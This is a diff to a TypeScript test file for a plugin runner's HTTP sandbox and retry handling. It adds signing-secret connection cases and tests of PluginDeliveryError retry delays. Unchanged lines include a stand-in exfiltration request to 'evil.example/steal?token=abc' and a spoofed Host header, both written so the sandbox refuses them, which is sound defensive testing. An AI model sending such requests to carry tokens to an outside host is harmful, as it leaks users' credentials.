@@ -1,6 +1,6 @@
 import test from 'node:test';
 import assert from 'node:assert/strict';
-import { PLUGIN_LOG_LIMITS, PLUGIN_STATE_LIMITS, type PluginHandlerInput, type PluginJsonValue } from '@propr/shared';
+import { PLUGIN_LOG_LIMITS, PLUGIN_RETRY_AFTER_LIMITS_MS, PLUGIN_STATE_LIMITS, PluginDeliveryError, parsePluginRetryAfter, type PluginHandlerInput, type PluginJsonValue } from '@propr/shared';
 import { runPluginHandler } from '../src/plugins/pluginHandlerRunner.js';
 import { FIXTURE_ID, pluginHandlerFixture } from './helpers/pluginHandlerFixture.js';
 
@@ -236,7 +236,10 @@ test('ctx.http refuses hosts not in outboundHosts, private addresses, plain HTTP
     [{ url: 'https://user:pass@api.fixture.example/v1' }, 'invalid_input'],
     [{ url: 'https://api.fixture.example/v1', init: { headers: { Host: 'evil.example' } } }, 'invalid_input'],
     [{ url: 'https://api.fixture.example/v1', connection: 'unset-token' }, 'connection_unavailable'],
-    [{ url: 'https://api.fixture.example/v1', connection: 'hook-secret' }, 'connection_unavailable'],
+    // A signing_secret connection signs requests: an unsigned one is refused, and a signed one needs the secret to be set.
+    [{ url: 'https://api.fixture.example/v1', connection: 'hook-secret' }, 'invalid_input'],
+    [{ url: 'https://api.fixture.example/v1', connection: 'hook-secret', init: { method: 'POST', body: '{}', signature: { header: 'x-sig' } } }, 'connection_unavailable'],
+    [{ url: 'https://api.fixture.example/v1', init: { method: 'POST', body: '{}', signature: { header: 'x-sig' } } }, 'invalid_input'],
     [{ url: 'https://api.fixture.example/v1', connection: 'undeclared' }, 'connection_unavailable'],
   ];
   for (const [payload, code] of cases) {
@@ -248,4 +251,24 @@ test('ctx.http refuses hosts not in outboundHosts, private addresses, plain HTTP
   const refused = await fetch({ url: 'https://evil.example/steal?token=abc', connection: 'api-token' });
   assert.deepEqual(refused.logs.map(l => [l.level, l.message]), [['warn', 'ctx.http request to evil.example refused: host_not_allowed']]);
   assert.equal(JSON.stringify(refused.logs).includes('token=abc'), false, 'only the hostname of a refused URL is logged');
+});
+
+test('a PluginDeliveryError gives the run its retry delay (bounded) or marks it permanent; other errors give neither', async t => {
+  const f = await pluginHandlerFixture(t);
+  const throwing = (error: () => unknown) => ({ ...f.options, handlers: async () => ({ fails: async () => { throw error(); } }) });
+  const rateLimited = await runPluginHandler(FIXTURE_ID, 'fails', invoke(), throwing(() => new PluginDeliveryError('busy', { retryAfterMs: 120_000 })));
+  assert.deepEqual([rateLimited.outcome, rateLimited.error, rateLimited.retryAfterMs, rateLimited.permanent], ['failed', 'busy', 120_000, undefined]);
+  const tooLong = await runPluginHandler(FIXTURE_ID, 'fails', invoke(), throwing(() => new PluginDeliveryError('later', { retryAfterMs: 10 * 24 * 60 * 60_000 })));
+  assert.equal(tooLong.retryAfterMs, PLUGIN_RETRY_AFTER_LIMITS_MS.max);
+  const permanent = await runPluginHandler(FIXTURE_ID, 'fails', invoke(), throwing(() => new PluginDeliveryError('refused', { permanent: true, retryAfterMs: 5_000 })));
+  assert.deepEqual([permanent.error, permanent.permanent, permanent.retryAfterMs], ['refused', true, undefined]);
+  // Recognised by name, as a handler bundling its own SDK copy throws it; a plain error carries no hint.
+  const lookalike = await runPluginHandler(FIXTURE_ID, 'fails', invoke(), throwing(() => Object.assign(new Error('copy'), { name: 'PluginDeliveryError', retryAfterMs: 500 })));
+  assert.equal(lookalike.retryAfterMs, PLUGIN_RETRY_AFTER_LIMITS_MS.min);
+  const plain = await runPluginHandler(FIXTURE_ID, 'fails', invoke(), throwing(() => Object.assign(new Error('plain'), { retryAfterMs: 500, permanent: true })));
+  assert.deepEqual([plain.retryAfterMs, plain.permanent], [undefined, undefined]);
+  assert.equal(parsePluginRetryAfter('120'), 120_000);
+  assert.equal(parsePluginRetryAfter('Wed, 21 Oct 2015 07:28:00 GMT', Date.parse('Wed, 21 Oct 2015 07:27:00 GMT')), 60_000);
+  assert.equal(parsePluginRetryAfter('soon'), null);
+  assert.equal(parsePluginRetryAfter(undefined), null);
 });
